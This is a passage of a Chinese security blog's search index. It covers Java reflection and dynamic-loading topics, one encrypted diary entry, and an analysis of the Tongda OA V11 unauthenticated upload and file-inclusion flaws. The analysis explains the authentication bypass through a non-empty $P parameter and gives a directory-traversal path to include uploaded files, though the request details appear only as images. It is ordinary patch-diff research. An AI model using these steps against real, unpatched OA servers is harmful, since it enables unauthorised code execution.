rel="noopener">https://www.jianshu.com/p/776c56fc3a80</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA安全</title>
      <link href="2020/06/09/JAVA%E5%AE%89%E5%85%A8/"/>
      <url>2020/06/09/JAVA%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>Java 安全主要在于‘反射’。</p><p>Java语言动态性一直以来都比较差，并不像PHP那样灵活。在Java中的动态性往往需要使用一些曲折的方式来实现.这里简单列举了Java十余种动态性相关技术：</p><ol><li>Java反射机制</li><li>MethodHandle</li><li>JDK动态代理</li><li>使用JVM上的动态语言(如:Groovy、JRuby、Jython)</li><li>表达式库(如:OGNL、MVEL、SpEL、EL)</li><li>JSP、JSPX、Quercus(Resin容器提供了PHP5支持)</li><li>字节码库(如:Asm、Javassist、Cglib、BCEL)</li><li>ScriptEngineManager(脚本引擎)。</li><li>动态编译(如:JDT、JavaCompiler)</li><li>ClassLoader、URLClassLoader</li><li>模版引擎(如:Freemarker、Velocity)</li><li>序列化、反序列化(包含Java 对象序列化、XML、JSON等)</li><li>JNI、JNA(Java调用C/C++)</li><li>OSGi(Open Service Gateway Initiative)</li><li>RMI(Java远程方法调用,基于对象序列化机制实现)</li><li>WebService</li><li>JDWP(Java Platform Debugger Architecture Java调试协议)</li><li>JMX(Java Management Extensions)</li></ol><p>参考链接：</p><p><a href="https://www.zhihu.com/question/29396506/answer/735521858" target="_blank" rel="noopener">https://www.zhihu.com/question/29396506/answer/735521858</a></p><p><a href="https://xz.aliyun.com/t/1633" target="_blank" rel="noopener">https://xz.aliyun.com/t/1633</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人杂记</title>
      <link href="2020/05/09/%E4%B8%AA%E4%BA%BA%E6%9D%82%E8%AE%B0/"/>
      <url>2020/05/09/%E4%B8%AA%E4%BA%BA%E6%9D%82%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="46018b3fe5df697a51652ee8f099f40f9f72fb44b252e5dc1de039ad238b8d51">7c5d6a903db12936b3d4c409af5a032e459475cfbd7a7221088cb3ded7a3ad9b0865fcabc35a6c0468a8369d9ef8ea42be47fa9c3ac6e01004b105e3e1fd4e6fa11d5248f47826e9fba4af09c31641424d27642d1883f5a5c8679985ddb023b0e4b5a2d04de5e6309c18af2b2a31d3426bea597113170847f35fb2a6af61ab1fe403cb5975b46b395991bd475f5abcef1ccf7c39b640a46fbd998d3e3834d966c3364afe8b61bd0d63a125a8e7743f657c8f48e5d5dad043bad9e8da794be5090a9e8fb107332494350d5a75f8bc95d7f2adbd531e0c5fb7061c6cc9e5c4bb2b3e622211595e95d2a4ee8136bcb42a234d52a429a431be3be72921a2434b0e45a347f3078a917b4d01e2f53c4bc9dba11039e014bc94f7c6f0661be73c54a372cbbade03e989e03ae27c7078815a9fee74cbabec22ce13d8595872f812b6349157ddc71edf1fd53fdeba87a5d402b32c64acec41fbf635dad0e304ad126a00b143e6a1a339645493d06302ae3fec0821b28ed4f8c6e2545ec282af8551997ff37a8ec5d7788990bd7971b27431048e471a7a9f036f1ffe6a5d73bda99e06fec6382fdfe901b8b80e123e1a869aa5bf4da38a6f686bd9e71b0a2d49a99713a810bd15d0f9c692cabd693497c7258988a1dd907f93476e458a4b0fd52d2a9de0332b3697faf6a2345fd521a54035430f40607c47a8b371cebbefc33583bc7c480dc375c8111a652ebf30fca1a13d0fabb753f816d5d76bf3bbfee2d6c5ee6e8626b7b2c622175f8c5879fa61ea011749485f5119aa3a988962b5d5531552bddcd93f0bc5cb715c5c0f06f674dfb1eda3ae53eaf65de7dc4e97e357caeaa896bb6429c13bafed086dc989f0ba3275f8bfc1d923845938dacc651d6a53dcb58d66355066c12b144c5de98126bf67bfb0791dfedac1698929420fe0b9e5da09def146b0ceaa09ba5fd109adeb4effa08e914056e6dc584444e07cd5bf541bfd7151d9fcd3b6e8614a1bb3032fe8e2287ae52bb091cf9eed51402169fdc6a6a99d97e16dae48d36fab0bc8454905a322bd87fd6922751d428d5f10a63c77f19989614e9d983ceb2cd1213735ac1f0e2173b3d4af29c0140281a3def2d835ba9d084ba0257e32ad9a1b4ba64d568b24f5e519c2cccd10a5f4e1b8af55d1bf9efb846e19791b01aa7ddd9a69eebd30e44928297dba79f49a55133bcb635d7d220074fb5532da657101754b0784ec923dfa316075f78e716e97fb02f994d107536609ecf0f14190a2dfeff39c7922dea9835ec44d937d4d0366b8bfd1449b7dfb0c356db7c58ec2ec4a4488b8b4fd52750b74aa77d3e2ba9c29432970be3a7dcc62328b917f1db80e45a5950cd9fb7db49da5974a853358646f0a2ff394c939f1195f5f3aa51cb1d0fdeab58d7d308c09d3b5ed506e9bfccbdb320df1c87a3765925a89595cc879760d7e85bebe37f51d6f2bb5983535bcf3368b26ab3fb5cad0ee8142e77c662ace6e8e0df1575471a6a6fbda74db5daf300e75ab912e53500881a9cd00663e1fd6a4df4c08d0c1f3c5032bf607a459cc6176d337346a719577fa8a3c3a3b90d306401b459a4e1a049b9021f50dc2cff1551bb8c4913f687fb5cb56b2dd3101a018ebab053efd6ce0c2bb936c13a077a69ff8c87891f3b9415eb455c2a3447696dc664e650bef2fa80adfb94bf0d274b2242b1fa7c81dd1a58b8cde9e9c3ff59171a678d4cc17307c72fc2fb3d077770a036d8b3e1caa036560b27fbcaf6c45c1a464407590cc85f2dc5107babfb3c4e6fa7dfa6dddb17837b50c3bd1ae3eee13563c2cdd11308514fca176573ce39883719915aa566b6eb4d936aa34ed88b292a3ef01b71a8c3095da3cf95681194e75f9d59e1e9376262f9c8ae44cb8eb45c71f334b689f65ec603da1efbd81a15f38e849fa6f69d057bd9bb6e982e0b74e4df16492fa3e0ca30d3ca213425012f9f3a8bd1454e56f523280a05af17911883245198413a69efa956cbd804099776d3ccc14e7c9492bd8f6a7dd4e6aba5f8a11152b9dd896f4f9aeb81c2a4674565adc3d90b8beee3649d0316e97b56e52b561fed9e422ccd298e28861f7d5f044fd8981565c50b704a577d2a2f2258c4b9602a0db2ef664c05dc106ed16ba8139307e992b2ec608d0914a32fe7ec8e22c0ca0781e8584baa22bab3b733d0cc60938c879d50c9f72224ca1aec9c8f48d89b829c19626e9c53cb04ba427e92a63952394dba9019abf1a06aecc8cd0efeac9e43b80c5b689e5d1d5d3f3076dac1860d9e862d636b77de0f9ce85f33b98fa4a8930717fb3f93de99618ddfdb07dd43038902cef65a498858c63572346e0f5f189853116ae2d291cf83478ba2cd63f0183b6dee74cf1276161886817f4053ec58752b9b463dfaa677f45db1de9d37f04bd924b0601fa8112c20811eecf824cf4c3dd0061f03c83b1faf707ad770599c1216c15dbea881c83adb705168f05c8b7bd7cd947c65300ca3933da96f8148071a4af76012b7a46db32e02819c238b98ba5abb58eb2d5562d1bd090bc3141e21215031eed8913a2bf1947316fd4a466f96cd474bbec757b1543e43742e98ce210f3fdceea4d146121f71a9d26cb25145d814b80b8ad52aebf10d52e3f84cbddb2a176191042dbaa510fccb4a4f4d883a3330871243a7af4e82cc1a7d8dc9433343a4e0b6c8a3a9a5198e74f4d02966569e0f5a86d3b5ebe14c2c01d736dba4913f1f62d25964a8615b4a36af17f53c697dab4ac16a11a70f766000c0b4cc9cfba82d77c1510570aeec267d1ff26c6625b069327a0a3b50b732bd2e178b75183c736506d1134623d8de43c638a382464ef5c749097374d95f22e75303c71bac07678465a759284708254c217303d8f67b5bc375b21226b43d39e9a9a73f49b131c2be8584691d806569b057a95e6ab45fd495ccc20f1ed747692e4fb4dd749b2b34d4a6bd88b9bee3a659af625eb421ee5c7950ce32eb163c2e3cde6e9b0be3b65e80f1f34966f2dcbfeb7befe188d3567f971d5274f8d0382f85f10616eed4d1fda8f6f74e43e6eed1d08f352ab932d084bf567e8236505950557bc2b098663df9113e58ca05df3c646654263485c89ec63c77674afe1bf72cd2d7353db503494b53b75f13639e95ce2f6a584e31e3446ed158e4a849a39c30cd09560ef95794f10d234ec73745a640f7cd68ec7427cb951ea82cdeced2658ba39afcf83fda047f40ff4e7bc71b1e0c01d7735ebe7452860e29fca91afb7997d155850e3c7e2a3ce3479f6dcf2c91f53fd3a2faf019fb7009567deb947e82cb5b6487729abce03631b69c4ba2867d71dc9f2211fad7f23e10a10cb64c9101cbaaa820c6b518b0741931ce8418dcd262bf685b2156b9cb6aaee4e8b998e9946717b2516b36d57e5a4b65633030bde41864482d6e9ad1d8cd9f962aa88528429df990ad09efa62d5c5faefb4760e23cb4c6915f83984dd4c2b178f9bb68e558014f6eb93b1a45484fbd2871cfdf642fc77ab47ca683b0f72bf2cb879295dba43de0b60fc6fb93f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>通达OA文件上传和文件包含漏洞分析</title>
      <link href="2020/03/20/%E9%80%9A%E8%BE%BEOA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>2020/03/20/%E9%80%9A%E8%BE%BEOA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="通达OA文件上传和文件包含漏洞分析"><a href="#通达OA文件上传和文件包含漏洞分析" class="headerlink" title="通达OA文件上传和文件包含漏洞分析"></a>通达OA文件上传和文件包含漏洞分析</h2><h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>3月13日，通达OA在官方论坛发布紧急通知并提供了对应版本的修复补丁。近日，各大厂商公众号也都发布了相关文章，漏洞POC也在逐渐公开。</p><h3 id="0x01-漏洞起因-补丁、源码对比分析"><a href="#0x01-漏洞起因-补丁、源码对比分析" class="headerlink" title="0x01 漏洞起因-补丁、源码对比分析"></a>0x01 漏洞起因-补丁、源码对比分析</h3><p>1、根据官网和网上公开的信息来看，文件上传漏洞存在多个版本，而文件包含漏洞似乎仅在V11存在，到通达官网下载V11.3版本安装包和补丁文件。</p><p>2、下载完成后发现php文件都被加密了，不能直接看到。使用在线zend解密工具解码文件。根据网上公开信息已知漏洞接口文件是upload.php和gateway.php。</p><p>3、对比修复前后的upload.php文件，发现改动的地方如图，这正是文件上传漏洞起因。可以看到未修复前对参数$P做了判断，当参数是空时，进行身份认证，意味着只要参数不为空，就不会进行身份认证，可以随意构造$P的值，从而导致未授权用户拥有上传文件的权限，而补丁文件不管$P是不是空都做身份认证。</p><p><img src="/imgs/clip_image002.jpg" alt="img"></p><p>4、对比修复前后的gateway.php，修复后主要对包含的URL的做了限制，不能包含“..”否则会报错，目的是限制通过“..”来获取到其他目录的文件。</p><p><img src="/imgs/clip_image004.jpg" alt="img"></p><h3 id="0x02-漏洞POC构造思路"><a href="#0x02-漏洞POC构造思路" class="headerlink" title="0x02 漏洞POC构造思路"></a>0x02 漏洞POC构造思路</h3><p>总体思路：首先上传文件，成功上传后需要知道文件对应所在目录，然后利用文件包含来读取上传的文件。</p><p>(1)  如何构造上传文件的HTTP请求？</p><p>分析upload.php源文件，构造涉及参数：</p><p>$P，$P值随意只要不为空；</p><p>$DEST_UID和$UPLOAD_MODE</p><table><thead><tr><th>$DEST_UID</th><th>$UPLOAD_MODE</th></tr></thead><tbody><tr><td>0</td><td>2</td></tr><tr><td>不为0</td><td>1</td></tr><tr><td>2</td><td></td></tr><tr><td>3</td><td></td></tr><tr><td>其它</td><td></td></tr></tbody></table><p>$_FILES[‘ATTACHMENT’][‘name’])及file</p><p>(2)  文件上传后对应目录在哪里？</p><p>分析代码，$FILE_PATH顾名思义是上传文件路径，attach_real_path这个函数找了下没找到是什么含义，最后百度了下找到了，是通达oa的开发函数，“根据附件的ID、名称等获取该附件在服务器上存储的物理路径，参数：$ATTACHMENT_ID $ATTACHMENT_NAME $MODULE 返回值：附件在服务器上的物理路径，如D:/MYOA/attach/email/”，到本地安装目录下查看确实有这个attach目录，根据$MODULE = ‘im’推测在/attach/im目录下。</p><p>至于文件名，每次上传的文件都有echo文件名。</p><p><img src="/imgs/clip_image006.jpg" alt="img"></p><p>图 代码分析</p><p><img src="/imgs/clip_image008.jpg" alt="img"></p><p>图 百度获取的attach_real_path含义</p><p><img src="/imgs/clip_image010.jpg" alt="img"></p><p>图 本地路径</p><p>(3)  如何构造文件包含HTTP请求？</p><p>首先需要包含general/、ispirit/、module/这三个中的任意一个，否则会报错，然后根据“..”来获取到对应上传文件的目录，从而包含到对应的文件。</p><p><img src="/imgs/clip_image012.jpg" alt="img"></p><h3 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h3><p>(1)  下载、傻瓜式安装通达OA</p><p><img src="/imgs/clip_image014.jpg" alt="img"></p><p><img src="/imgs/clip_image016.jpg" alt="img"></p><p>(2)  根据前面的思路构造上传文件的HTTP POST请求，根据响应+OK [vm]379@2003_1950118141|ATTACHMENT|0[/vm]获取到文件路径和名称。到本地目录查看。</p><p><img src="/imgs/clip_image018.jpg" alt="img"></p><p>图 上传文件HTTP请求</p><p><img src="/imgs/clip_image019.png" alt="img"></p><p>图 文件路径</p><p>(3)构造包含路径的参数值，根据前面的思路，general/、ispirit/、module/这三个中的任意一个结合“..”来获取到对应上传文件的路径， attach和webroot在同意层，而general在webroot目录下，所以general的上级目录可用获取到attach，即general../attach，而general/的上上级可获取attach，即general/../../attach。最终文件路径如下：general/../../attach/im/2003/1950118141.attachment。</p><p><img src="/imgs/clip_image021.jpg" alt="img"></p><p>(4)本地文件包含请求如下注意编码格式为url编码：</p><p><img src="/imgs/clip_image023.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> OA </category>
          
          <category> 通达OA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 通达OA </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
